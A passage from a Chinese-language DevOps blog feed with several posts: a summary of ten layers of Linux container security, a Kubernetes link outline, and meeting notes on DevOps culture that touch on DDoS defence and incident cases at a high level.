-gocmd &lt;<span class="built_in">string</span>&gt;</span><br><span class="line">          <span class="function">use the given go binary to compile the <span class="title">output</span> <span class="params">(<span class="keyword">default</span>: <span class="string">"go"</span>)</span></span></span><br><span class="line">  -t &lt;string&gt;</span><br><span class="line">          <span class="function">timeout in duration parsable <span class="title">format</span> <span class="params">(e.g. <span class="number">5</span>m30s)</span></span></span><br><span class="line">  -v      show verbose output when running mage targets</span><br></pre></td></tr></table></figure>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="DevOps-漫谈系列"><a href="#DevOps-漫谈系列" class="headerlink" title="DevOps 漫谈系列"></a><a href="https://riboseyim.github.io/2016/07/28/DevOps/" target="_blank" rel="noopener">DevOps 漫谈系列</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/" target="_blank" rel="noopener">《凤凰项目》：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/" target="_blank" rel="noopener">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/" target="_blank" rel="noopener">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/" target="_blank" rel="noopener">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/" target="_blank" rel="noopener">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="DevOps-实践的本质是文化"><a href="#DevOps-实践的本质是文化" class="headerlink" title="DevOps 实践的本质是文化"></a><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/" target="_blank" rel="noopener">DevOps 实践的本质是文化</a></h4><ul>
<li>学习力－团队生命之根</li>
<li>带领团队翻译书籍</li>
<li>Don’t make me think</li>
<li>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://blog.gopheracademy.com/advent-2018/mage-best-practices/" target="_blank" rel="noopener">Best Practices for Using Mage To Build Your Project  </a></li>
<li><a href="https://studygolang.com/articles/10589" target="_blank" rel="noopener">Golang官方依赖管理工具：dep</a></li>
<li><a href="https://blog.gopheracademy.com/advent-2018/building-ci-cd-slack-bot/" target="_blank" rel="noopener">Building a CI/CD Bot with Slack and Kubernetes.</a></li>
<li><a href="https://gocn.vip/article/414" target="_blank" rel="noopener">官方依赖管理工具：dep</a></li>
<li><a href="https://halfrost.com/go_command/" target="_blank" rel="noopener">初探 Go 的编译命令执行过程</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title>Cyber-Security:Linux容器安全的十重境界</title>
    <url>/2017/11/12/DevOps-Container-Security/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>容器安全解决方案需要考虑不同技术栈和容器生命周期的不同阶段。</p>
<span id="more"></span>
<p>This article is part of an <strong>Virtualization Technology</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
<li><a href="https://riboseyim.github.io/2018/06/12/DevOps-Container-Usage/">2018 年度 Docker 用户报告 - Sysdig Edition </a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/08/21/DevOps-Docker/">DevOps漫谈：Docker ABC</a></li>
</ul>
<h2 id="提纲"><a href="#提纲" class="headerlink" title="提纲"></a>提纲</h2><ul>
<li>1.容器操作系统与多租户</li>
<li>2.容器内容（使用可信源）</li>
<li>3.容器注册 (容器镜像加密访问)</li>
<li>4.构建过程安全</li>
<li>5.控制集群中可部署的内容</li>
<li>6.容器编排：加强容器平台安全</li>
<li>7.网络隔离</li>
<li>8.存储</li>
<li>9.API 管理, 终端安全和单点登录 (SSO)</li>
<li>10.角色和访问控制管理</li>
</ul>
<p>容器提供了一种简单的应用程序打包方法将它们无缝地从开发、测试环境部署到生产环境。它有助于确保各种环境中的一致性，包括物理服务器、虚拟机（VM）或私有或公共云。领先的组织基于这些好处迅速采用容器，以便轻松地开发和管理增加业务价值的应用程序。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linux-Containers-Security-5.png" alt=""></p>
<p>企业应用需要强壮的安全性，任何在容器中运行基础服务的人都会问：“容器是安全的吗？”、“可以让我们的应用程序信任容器吗？”</p>
<p>保护容器非常类似于确保任何正在运行的进程。在部署和运行容器之前，您需要考虑整个解决方案技术栈的安全性。您还需要考虑在应用程序和容器的完整生命周期的安全性。</p>
<p>请尝试在这 10 个方面加强容器的不同层次、不同技术栈和不同生命周期阶段的安全性。</p>
<h4 id="1-容器操作系统与多租户"><a href="#1-容器操作系统与多租户" class="headerlink" title="1. 容器操作系统与多租户"></a>1. 容器操作系统与多租户</h4><p>对于开发人员来说，容器使得他们更容易地构建和升级应用程序，它可以作为一个应用单元的被依赖，通过在共享主机上部署启用多租户应用程序来最大限度地利用服务器资源。容器很容易在单个主机上部署多应用程序，并根据需要开启和关闭单个容器。为了充分利用这种打包和部署技术，运维团队需要正确的运行容器环境。运维人员需要一个操作系统，该系统可以在边界处保护容器，使主机内核与容器隔离并确保容器彼此之间安全。</p>
<p>容器是隔离和约束资源的 Linux 进程，使您能够在共享宿主内核中运行沙盒应用程序。您保护容器的方法应该与确保 Linux 上任何正在运行的进程的安全方法相同。放弃特权是重要的，目前仍然是最佳实践。更好的方法是创建尽可能少的特权容器。容器应该作为普通用户运行，而不是 root 用户。接下来，利用 Linux 中可用的多种级别的安全特性确保容器的安全： Linux 命名空间，安全增强的Linux（SELinux）， cgroups，capabilities 和安全计算模式（seccomp）。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linux-Containers-Security-1.jpg" alt=""></p>
<h4 id="2-容器内容（使用可信源）"><a href="#2-容器内容（使用可信源）" class="headerlink" title="2. 容器内容（使用可信源）"></a>2. 容器内容（使用可信源）</h4><p>当说到安全性的时候，对于容器内容来说意味着什么呢？。一段时间以来，应用程序和基础设施都是由现成的组件组成的。很多都来自于开源软件，例如如 Linux 操作系统，Apache Web 服务器，红帽 JBoss 企业应用平台，PostgreSQL 和 Node.js。基于容器的各种软件包版本现在一应俱全，所以你不需要建立自己。但是，与从外部源下载的任何代码一样，您需要知道包的起源、它们是由谁创建，以及它们内部是否存在恶意代码。</p>
<h4 id="3-容器注册-容器镜像加密访问"><a href="#3-容器注册-容器镜像加密访问" class="headerlink" title="3. 容器注册 (容器镜像加密访问)"></a>3. 容器注册 (容器镜像加密访问)</h4><p>你的团队构建容器的时候基于下载的公共容器镜像，<br>所以对它的访问管理和更新下载是管理的关键，需以同样的方式管理容器镜像、内建的镜像及其他类型的二进制文件。许多私有仓库注册服务器支持存储容器镜像。选择一个私有的、存储使用的容器镜像自动化策略的注册服务器。</p>
<h4 id="4-构建过程安全"><a href="#4-构建过程安全" class="headerlink" title="4. 构建过程安全"></a>4. 构建过程安全</h4><p>在一个容器化的环境里，软件的构建是整个生命周期的一个阶段，应用程序代码需要与运行库集成。管理此构建过程是确保软件栈安全的关键。坚持“一次构建，到处部署（build once, deploy everywhere）”的理念，确保构建过程的产品正是生产中部署的产品。这一点对于维护容器持续稳定也非常重要，换句话说，不要为运行的容器打补丁；而是应该重新构建、重新部署它们。<br>无论您是在高度规范的行业中工作，还是仅仅想优化团队的工作，需要设计容器镜像的管理和构建过程，以利用容器层实现控制分离，从而使：</p>
<ul>
<li>运维团队管理基础镜像</li>
<li>架构团队管理中间件、运行时、数据库和其它解决方案</li>
<li>开发团队仅仅专注于应用层和代码</li>
</ul>
<p>最后，对定制的容器签名，这样可以确保它们在构建和部署环节之间不会被篡改。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linux-Containers-Security-4.png" alt=""></p>
<h4 id="5-控制集群中可部署的内容"><a href="#5-控制集群中可部署的内容" class="headerlink" title="5. 控制集群中可部署的内容"></a>5. 控制集群中可部署的内容</h4><p>为了防备在构建过程中发生任何问题，或者在部署一个镜像后发现漏洞，需要增加以自动化的、基于策略的部署的另一层安全性。</p>
<p>让我们看一下构建应用程序的三个容器镜像层：核心层（core）、中间件层（middleware）和应用层（application）。一个问题如果在核心镜像被发现，镜像会重新构建。一旦构建完成，镜像将被推入容器平台注册服务器。平台可以检测到镜像发生了变化。对于依赖于此镜像并有定义触发器的构建，该平台将自动重建应用程序并整合已经修复的库。</p>
<p>一旦构建完成，镜像将被推入容器平台的内部注册服务器。内部注册服务器中镜像的变化能立即检测到，通过应用程序中定义的触发器自动部署更新镜像，确保生产中运行的代码总是与最近更新的镜像相同。所有这些功能协同工作，将安全功能集成到您的持续集成和持续部署（CI / CD）过程中。</p>
<h4 id="6-容器编排：加强容器平台安全"><a href="#6-容器编排：加强容器平台安全" class="headerlink" title="6. 容器编排：加强容器平台安全"></a>6. 容器编排：加强容器平台安全</h4><p>当然，应用程序很少在单个容器中交付。即使是简单的应用程序通常有一个前端，后端和数据库。在容器中部署现代微服务应用，通常意味着多容器部署，有时在同一主机上有时分布在多个主机或节点，如图所示。</p>
<p>当规模化管理容器部署时，您需要考虑：</p>
<ul>
<li>哪些容器应该部署到哪个主机上？</li>
<li>哪个主机容量更大？</li>
<li>哪些容器需要相互访问？他们将如何相互发现？</li>
<li>如何控制对共享资源的访问和管理，比如网络和存储？</li>
<li>如何监控容器健康状态？</li>
<li>如何自动扩展应用能力以满足需求？</li>
<li>如何使开发者在自助服务的同时满足安全需求？</li>
</ul>
<p>考虑到开发人员和运维人员拥有的广泛能力，强大的基于角色的访问控制是容器平台的关键元素。例如，编排管理服务器是访问的中心点，应该得到最高级别的安全检查。API 是大规模自动化容器管理的关键，用于验证和配置容器、服务和复制控制器的数据；对传入的请求执行项目验证；并调用其他主要系统组件上的触发器。</p>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Linux-Containers-Security-3.png" alt=""></p>
<h4 id="7-网络隔离"><a href="#7-网络隔离" class="headerlink" title="7. 网络隔离"></a>7. 网络隔离</h4><p>在容器部署现代微服务应用程序往往意味着在多个节点分布式部署多个容器。考虑到网络防御，您需要一种在集群中隔离应用程序的方法。</p>
<p>一个典型的公共云服务，例如Google Container Engine (GKE),Azure Container Services, 或者 Amazon Web Services (AWS) Container Service，都是单租户服务。它们允许在您启动的 VM 集群上运行容器。为了实现多租户容器安全，您需要一个容器平台，允许您选择单个集群并将流量分段，以隔离该集群中的不同用户、团队、应用程序和环境。</p>
<p>通过网络命名空间，每个容器集合（称为“POD”）获得自己的IP和端口绑定范围，从而在节点上隔离 POD 网络。</p>
<p>默认情况下，来自不同命名空间（项目）的 POD  不能将包发送到或接收来自不同项目的 POD 、服务的数据包，除了下文所述的选项。您可以使用这些特性来隔离集群中的开发人员、测试和生产环境；然而，IP 地址和端口的这种扩展使得网络变得更加复杂。可以投资一些工具处理这种复杂性。首选的工具是采用<a href="https://riboseyim.github.io/2017/05/12/SDN/">软件定义网络（SDN）</a>容器平台，它提供统一的集群网络，保证整个集群的容器之间的通信。</p>
<h4 id="8-存储"><a href="#8-存储" class="headerlink" title="8. 存储"></a>8. 存储</h4><p>对于有状态和无状态的应用程序来说，容器是非常有用的。<br>保护存储是保证有状态服务的关键要素。容器平台应提供多样化的存储插件，包括网络文件系统（NFS），AWS Elastic Block Stores（EBS，弹性块存储），GCE Persistent 磁盘，GlusterFS，iSCSI，RADOS（CEPH）、Cinder 等等。</p>
<p>一个持久卷（PV）可以安装在由资源提供者支持的任何主机。供应商将有不同的能力，每个 PV 的访问模式可以设置为特定卷支持的特定模式。例如，NFS 可以支持多个 读/写的客户端，但一个特定的 NFS  PV 可以在服务器上仅作为只读输出。每个 PV 有它自己的一套访问模式，定义特定 PV 的性能指标，例如ReadWriteOnce, ReadOnlyMany, 和 ReadWriteMany。</p>
<h4 id="9-API-管理-终端安全和单点登录-SSO"><a href="#9-API-管理-终端安全和单点登录-SSO" class="headerlink" title="9. API 管理, 终端安全和单点登录 (SSO)"></a>9. API 管理, 终端安全和单点登录 (SSO)</h4><p>保护应用程序安全包括管理应用程序和 API 身份验证和授权。<br>Web SSO 功能是现代应用程序的关键部分。当开发者构建他们自己的应用时，容器平台可以提供各种容器服务给他们使用。</p>
<p>API 是<a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">微服务</a>应用的关键组成部分。<a href="https://riboseyim.github.io/2017/06/12/OpenSource-Kafka-Microservice/">微服务</a>应用具有多个独立的 API 服务，这导致服务端点的扩张，因此需要更多的治理工具。推荐使用 API 管理工具。所有 API 平台都应该提供各种 API 认证和安全的标准选项，它们可以单独使用或组合使用，发布证书和控制访问。这些选项包括标准的 API 密钥、应用ID、密钥对和 <a href="https://riboseyim.github.io/2017/05/23/RestfulAPI/">OAuth 2.0</a>。</p>
<h4 id="10-角色和访问控制管理（Cluster-Federation）"><a href="#10-角色和访问控制管理（Cluster-Federation）" class="headerlink" title="10. 角色和访问控制管理（Cluster Federation）"></a>10. 角色和访问控制管理（Cluster Federation）</h4><p>2016年7月，Kubernetes 1.3  介绍了 Kubernetes Federated Cluster。这是一个令人兴奋的新功能，目前在 Kubernetes 1.6 beta 。</p>
<p>在公共云或企业数据中心场景中，Federation 对于跨集群部署和访问应用服务是很有用的。多集群使得应用程序的高可用性成为可能，例如多个区域、多个云提供商（如AWS、Google Cloud 和 Azure）实现部署或迁移的通用管理。</p>
<p>在管理集群联邦时，必须确保编排工具在不同的部署平台实例中提供所需的安全性。与以往一样，身份验证和授权是安全的关键 —— 能够安全地将数据传递给应用程序，无论它们在何处运行，在集群中管理应用程序多租户。</p>
<p>Kubernetes 扩展了集群联邦包括支持联邦加密，联邦命名空间和对象入口。</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://opensource.com/article/17/10/10-layers-container-security">10 layers of Linux container security | Daniel Oh | Senior Specialist Solution Architect at Red Hat</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="网络安全专题合辑《Cyber-Security-Manual》"><a href="#网络安全专题合辑《Cyber-Security-Manual》" class="headerlink" title="网络安全专题合辑《Cyber-Security Manual》"></a>网络安全专题合辑《Cyber-Security Manual》</h4><ul>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Cyber-Security: Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/10/29/CyberSecurity-WiFi/">Cyber-Security: 警惕 Wi-Fi 漏洞，争取安全上网</a></li>
<li><a href="https://riboseyim.github.io/2017/08/31/CyberSecurity-Headers/">Cyber-Security: Web应用安全：攻击、防护和检测</a></li>
<li><a href="https://riboseyim.github.io/2017/08/09/Protocol-IPv6/">Cyber-Security: IPv6 &amp; Security</a></li>
<li><a href="https://riboseyim.github.io/2016/10/06/CyberSecurity-SSH/">Cyber-Security: OpenSSH 并不安全</a></li>
<li><a href="https://riboseyim.github.io/2016/06/12/CyberSecurity-Trojan/">Cyber-Security: Linux/XOR.DDoS 木马样本分析</a></li>
<li><a href="https://riboseyim.github.io/2017/07/14/Network-sFlow/">浅谈基于数据分析的网络态势感知</a></li>
<li><a href="https://riboseyim.github.io/2017/06/16/Network-Pcap/">Packet Capturing:关于网络数据包的捕获、过滤和分析</a></li>
<li><a href="https://riboseyim.github.io/2016/04/26/Network-Ntopng/">新一代Ntopng网络流量监控—可视化和架构分析</a></li>
<li><a href="http://www.jianshu.com/p/670c4d2bb419">Cyber-Security: 事与愿违的后门程序 | Economist</a></li>
<li><a href="https://riboseyim.github.io/2016/10/07/CyberSecurity/">Cyber-Security: 美国网络安全立法策略</a></li>
<li><a href="https://riboseyim.github.io/2017/04/09/CyberSecurity-CSTCB/">Cyber-Security: 香港警务处拟增设网络安全与科技罪案总警司</a></li>
</ul>
<h4 id="DevOps-漫谈系列"><a href="#DevOps-漫谈系列" class="headerlink" title="DevOps 漫谈系列"></a><a href="https://riboseyim.github.io/2016/07/28/DevOps/">DevOps 漫谈系列</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">《凤凰项目》：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="DevOps-实践的本质是文化"><a href="#DevOps-实践的本质是文化" class="headerlink" title="DevOps 实践的本质是文化"></a><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/">DevOps 实践的本质是文化</a></h4><ul>
<li>学习力－团队生命之根</li>
<li>带领团队翻译书籍</li>
<li>Don’t make me think</li>
<li>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Cyber-Security</tag>
        <tag>网络协议</tag>
      </tags>
  </entry>
  <entry>
    <title>DevOps 漫谈：Kubernetes</title>
    <url>/2017/11/15/DevOps-Container-Kubernetes/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>The History</li>
<li>Overview of the Kubernetes</li>
<li>Application and Development</li>
<li>Future</li>
</ul>
<a id="more"></a>
<h2 id="The-Big-Picture"><a href="#The-Big-Picture" class="headerlink" title="The Big Picture"></a>The Big Picture</h2><h3 id="The-History"><a href="#The-History" class="headerlink" title="The History"></a>The History</h3><h2 id="Overview-of-the-Kubernetes"><a href="#Overview-of-the-Kubernetes" class="headerlink" title="Overview of the Kubernetes"></a>Overview of the Kubernetes</h2><h2 id="Application-and-Development"><a href="#Application-and-Development" class="headerlink" title="Application and Development"></a>Application and Development</h2><h3 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h3><ul>
<li><a href="https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/cluster-intro/#" target="_blank" rel="noopener">使用 Minikube 创建一个集群</a></li>
</ul>
<h3 id="Container-management-platform-Rancher"><a href="#Container-management-platform-Rancher" class="headerlink" title="Container management platform:Rancher"></a>Container management platform:Rancher</h3><ul>
<li><a href="https://rancher.com/quick-start/" target="_blank" rel="noopener">Rancher Quick Start</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="DevOps-漫谈系列"><a href="#DevOps-漫谈系列" class="headerlink" title="DevOps 漫谈系列"></a><a href="https://riboseyim.github.io/2016/07/28/DevOps/" target="_blank" rel="noopener">DevOps 漫谈系列</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/" target="_blank" rel="noopener">《凤凰项目》：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/" target="_blank" rel="noopener">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/" target="_blank" rel="noopener">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/" target="_blank" rel="noopener">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/" target="_blank" rel="noopener">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="DevOps-实践的本质是文化"><a href="#DevOps-实践的本质是文化" class="headerlink" title="DevOps 实践的本质是文化"></a><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/" target="_blank" rel="noopener">DevOps 实践的本质是文化</a></h4><ul>
<li>学习力－团队生命之根</li>
<li>带领团队翻译书籍</li>
<li>Don’t make me think</li>
<li>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://agentneoteam.github.io/2018/05/07/agentneo-jia-gou-jian-jie.html#rancher" target="_blank" rel="noopener">AgentNEO 架构简介</a></li>
<li><a href="https://enterprisersproject.com/article/2019/5/kubernetes-jobs-hunt-how-transition" target="_blank" rel="noopener">5 tips to transition into a Kubernetes job</a></li>
<li><a href="http://cizixs.com/2018/06/25/kubernetes-resource-management" target="_blank" rel="noopener">Kubernetes 资源管理概述</a></li>
<li><a href="http://www.chenshake.com/openshift%e5%9b%be%e8%a7%a3/" target="_blank" rel="noopener">OpenShift 图解</a></li>
<li><a href="https://blog.alexellis.io/move-your-project-to-kubernetes/?utm_campaign=Tutorial&amp;utm_content=69416123&amp;utm_medium=social&amp;utm_source=twitter" target="_blank" rel="noopener">Five tips to move your project to Kubernetes</a></li>
<li><a href="https://blog.gopheracademy.com/advent-2017/kubernetes-ready-service/" target="_blank" rel="noopener">Write a Kubernetes-ready service from zero step-by-step | Go-lang</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAxOTAzMDEwMA==&amp;mid=2652502283&amp;idx=2&amp;sn=c25f88ce02aa30aaa8a4d86465fe5f19&amp;chksm=80201030b75799260a394e7e7272ef2a72e6905b4b3413dcd7c04274c4c1dd522eaef878d20e&amp;mpshare=1&amp;scene=1&amp;srcid=0306ziMypn6rtlzRbFA6ywHa%23rd" target="_blank" rel="noopener">kubernetes在腾讯游戏的应用实践|2017-03-06 黄惠波 云技术实践</a></li>
<li><a href="https://coolshell.cn/articles/18654.html" target="_blank" rel="noopener">记一次KUBERNETES/DOCKER网络排障</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
      </tags>
  </entry>
  <entry>
    <title>DevOps 漫谈：DevOps实践的本质是文化</title>
    <url>/2018/03/29/DevOps-Culture/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>DevOps实践的本质是文化</li>
</ul>
<span id="more"></span>
<h2 id="DevOps实践的本质是文化"><a href="#DevOps实践的本质是文化" class="headerlink" title="DevOps实践的本质是文化"></a>DevOps实践的本质是文化</h2><p>2016-07-24 运维日 广州活动纪要<br>地点：羊城晚报 同创汇</p>
<h4 id="刘宇"><a href="#刘宇" class="headerlink" title="刘宇"></a>刘宇</h4><p>职业路径：新浪－&gt;Puppet实践－&gt;Puppet系列文集－&gt;InfoQ编辑－&gt;西山居<br>社区：LinuxTone.org、InfoQ</p>
<ul>
<li>Automation：工具化</li>
<li>Lean 精益：</li>
<li>Measurement：度量一切</li>
<li><p>Sharing：不管是否成功</p>
</li>
<li><p>人物：Patrick Debois：比利时，独立顾问，DevOps领袖（2008年）</p>
</li>
</ul>
<p><strong>推荐书单</strong></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">《The Phoenix Project》</a></li>
<li><p>《The DevOps Cookbook》</p>
</li>
<li><p>企业：Facebook</p>
<blockquote>
<p>Don’t make me think</p>
</blockquote>
</li>
</ul>
<p><strong>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</strong></p>
<ul>
<li>实践经验<br>1.站立会<br>2.<a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban|看板</a><br>3.复盘：总结－发现问题－改进<br>4.<a href="https://riboseyim.github.io/2017/06/27/Technology-English/">带领团队翻译书籍 （这事听着都打鸡血)</a></li>
</ul>
<blockquote>
<p>学习力－团队生命之根</p>
</blockquote>
<h4 id="魅族云"><a href="#魅族云" class="headerlink" title="魅族云"></a>魅族云</h4><p>1.异地多活：专线打通多个IDC机房<br>2.KVM<br>3.网络：OpenStack 实现控制器、GSLB 全局负载均衡，智能路由</p>
<h4 id="微信：自动压力测试实践"><a href="#微信：自动压力测试实践" class="headerlink" title="微信：自动压力测试实践"></a>微信：自动压力测试实践</h4><p>张兴：8年＋</p>
<p>1.生产环境运行压力测试<br>2.接入Proxy层，调整请求分配权重<br>3.压测管控</p>
<p>失败监控（系统、逻辑）<br>耗时监控（SUR client）<br>快速拒绝（如何判断是否可以丢弃？）<br>硬件限制（CPU，内存，网卡）</p>
<p>数据：<br>15s监控数据入库画图，<br>1min回退配置（1w台服务器），<br>降低放量速率</p>
<h4 id="YY安全"><a href="#YY安全" class="headerlink" title="YY安全"></a>YY安全</h4><ul>
<li>案例一：海量小包攻击性防御<br>1.20140828  脉冲DDoS攻击<br>40小时，40人团队，监控不足<br>5秒钟一次，发送小包</li>
</ul>
<p>黑产报价：150元可购买 15G流量，700W pps，攻击成本低</p>
<ul>
<li>案例二：合作方服务器被入侵概率高（木马）</li>
</ul>
<p>ps/netstat污染处理：内核态，查看System.Call  (可以挖掘写一篇)</p>
<ul>
<li><p>案例三：主播IP泄漏<br>业务逻辑bug，异常抛出IP</p>
</li>
<li><p>案例四<br>确定当前主要矛盾：投诉盗号、盗刷？服务器入侵？DDoS ?<br>利用现有资源（自有编制、第三方合作），最大投入产出比</p>
</li>
<li><p>决策变量<br>技术预研、业务规模、发展阶段、主要矛盾（切入点）</p>
</li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="DevOps-漫谈系列"><a href="#DevOps-漫谈系列" class="headerlink" title="DevOps 漫谈系列"></a><a href="https://riboseyim.github.io/2016/07/28/DevOps/">DevOps 漫谈系列</a></h4><ul>
<li><a href="https://riboseyim.github.io/2018/04/10/DevOps-Phoenix/">《凤凰项目》：从作坊到工厂的寓言故事</a></li>
<li><a href="https://riboseyim.github.io/2017/08/06/TeamWork-Kanban/">Kanban 看板管理实践</a></li>
<li><a href="https://riboseyim.github.io/2018/03/26/DevOps-Deployment/">DevOps 漫谈：基础设施部署和配置管理</a></li>
<li><a href="https://riboseyim.github.io/2017/11/12/DevOps-Container-Security/">Linux 容器安全的十重境界</a></li>
<li><a href="https://riboseyim.github.io/2017/06/27/Technology-English/">工程师的自我修养：全英文技术学习实践</a></li>
</ul>
<h4 id="DevOps-实践的本质是文化"><a href="#DevOps-实践的本质是文化" class="headerlink" title="DevOps 实践的本质是文化"></a><a href="https://riboseyim.github.io/2018/03/29/DevOps-Culture/">DevOps 实践的本质是文化</a></h4><ul>
<li>学习力－团队生命之根</li>
<li>带领团队翻译书籍</li>
<li>Don’t make me think</li>
<li>凡是被很多人不断重复的好习惯，要将其自动化整合到工具</li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzA4Nzg5Nzc5OA==&amp;mid=400138875&amp;idx=1&amp;sn=01b4ea2978370d215442e4a22d7d2a7f&amp;scene=1&amp;srcid=1028tfQzmCsfXfTybP9dWEAy#rd">中小企业监控体系构建实战</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MzAwMDU1MTE1OQ==&amp;mid=2653548227&amp;idx=1&amp;sn=3deb458aa18fa878dc9eaf89aaa78303&amp;chksm=813a7f5bb64df64d7037213ef34b3ff6c09375593ec82919b214829b825e82565b6058366ef1&amp;mpshare=1&amp;scene=1&amp;srcid=01190z58NNndr7YlKBPp5Jz6#rd">LinkedIn:如何利用大数据算法定位网站性能瓶颈(BOSS)</a></li>
<li><a href="http://jaseywang.me/2017/02/08/%e6%a0%91%e8%8e%93%e6%b4%beraspberrypi%e3%80%81saltstack-%e5%9c%a8%e7%ba%bf%e4%b8%8b%e8%87%aa%e5%8a%a9%e6%9c%ba%e8%bf%90%e7%bb%b4%e4%b8%8a%e7%9a%84%e5%ba%94%e7%94%a8/">树莓派(raspberrypi)、saltstack 在线下自助机运维上的应用 | Jasey Wang</a></li>
<li><a href="http://abruzzi.github.com/2016/05/design-for-failure/">邱俊涛：为故障和失败做设计</a></li>
<li><a href="http://coolshell.cn/articles/17737.html">酷壳：AWS 的 S3 故障回顾和思考</a></li>
<li><a href="http://coolshell.cn/articles/17680.html">酷壳：从GITLAB误删除数据库想到的</a></li>
<li><a href="http://coolshell.cn/articles/17446.html">酷壳：这多年来我一直在钻研的技术</a></li>
<li><a href="http://www.infoq.com/cn/presentations/chatops-at-github">GitHub运维机器人</a></li>
<li><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=206585329&amp;idx=1&amp;sn=b3cdb637dfff9b4378ec703c9b27a331&amp;scene=1%23rd">运维的本质：可视化 |2015-05-14 王津银 InfoQ</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>Engineering</tag>
      </tags>
  </entry>
  <entry>
    <title>DevOps 漫谈：容器技术</title>
    <url>/2018/06/12/DevOps-Container-Usage/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>2018 Docker 用户报告 - Sysdig Edition</li>
<li>应用排行榜</li>
<li>容器运行环境</li>
<li>容器编排器</li>
<li>容器监控</li>
</ul>
<span id="more"></span>
<p>This article is part of an <strong>Virtualization Technology</strong> tutorial series. Make sure to check out my other articles as well:</p>
<ul>
